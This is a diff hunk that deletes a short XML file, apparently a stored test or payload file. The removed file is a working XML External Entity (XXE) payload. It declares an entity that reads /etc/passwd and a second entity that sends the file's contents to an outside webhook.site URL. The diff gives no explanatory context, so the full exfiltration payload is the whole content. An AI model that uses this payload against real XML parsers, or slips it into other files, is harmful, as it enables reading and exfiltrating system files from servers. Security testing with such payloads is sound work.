@@ -1,8 +1,0 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
-<!ENTITY callhome SYSTEM "https://webhook.site/930a6386-1441-4fc9-8896-84af2191a545?%xxe;">
-]
->
-<foo>&callhome;</foo>
